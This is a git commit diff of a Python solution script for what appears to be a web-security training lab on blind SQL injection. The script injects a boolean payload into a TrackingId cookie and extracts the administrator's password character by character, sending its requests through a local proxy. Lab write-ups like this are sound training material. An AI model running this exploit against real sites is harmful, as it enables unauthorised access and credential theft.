9beb4f2cd17a81a949a265ecfbf8016a85d7449a
HadyFTW <a.m.elhady@outlook.com>
2021-10-10 15:24:03 +0200

    Completed SQLi Lab 11

--- SQL-Injection/lab-11/lab-11.py
+++ SQL-Injection/lab-11/lab-11.py
@@ -1,20 +1,19 @@
-import sys
-import urllib.parse
-import requests
-import urllib3
+import requests, sys, urllib3, urllib.parse
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
-def exploit_password(url):
-    extracted_password = ""
-    for i in range(1, 14):
+def exploit_sqli(url):
+    traking_id_cookie = "7vJELm4RE9DYHLeW"
+    session_id_cookie = "fS1aoyoJMAU9uPLPQfaVxlpXjgpZcXdt"
+    extracted_password = ''
+    for i in range(1, 21):
         for j in range(32, 126):
-            sql_payload = f"' and (select ascii(substring(password,{i},1)) from users WHERE username='administrator')='{j}' --"
-            sql_payload_encoded = urllib.parse.quote(sql_payload)
-            cookies = {"TrackingId": "rnE0GkpwXapBKfra" + sql_payload_encoded, "session": "cFlts5wfaVl8OvzOQmCrxJQVhgm3iXeY"}
+            payload = f"' AND (SELECT SUBSTRING(password, {i}, 1) FROM users WHERE username = 'administrator')='{chr(j)}'--"
+            encoded_payload = urllib.parse.quote(payload)
+            cookies = {"TrackingId": traking_id_cookie + encoded_payload, "session": session_id_cookie}
             r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
-            if 'Welcome' not in r.text:
+            if "Welcome" not in r.text:
                 sys.stdout.write('\r' + extracted_password + chr(j))
                 sys.stdout.flush()
             else:
@@ -22,7 +21,6 @@ def exploit_password(url):
                 sys.stdout.write('\r' + extracted_password)
                 sys.stdout.flush()
                 break
-            
 
 
 def main():
@@ -32,10 +30,10 @@ def main():
         print(f'[-] Usage: python3 {sys.argv[0]} <url>')
         print(f'[-] Example: python3 {sys.argv[0]} http://example.com')
         sys.exit(1)
+    
+    print('[*] Reteriving the administrator password...')
+    exploit_sqli(url)
 
-
-    print("[+] Retrieving administrator password...")
-    exploit_password(url)
 
 if __name__ == '__main__':
     main()
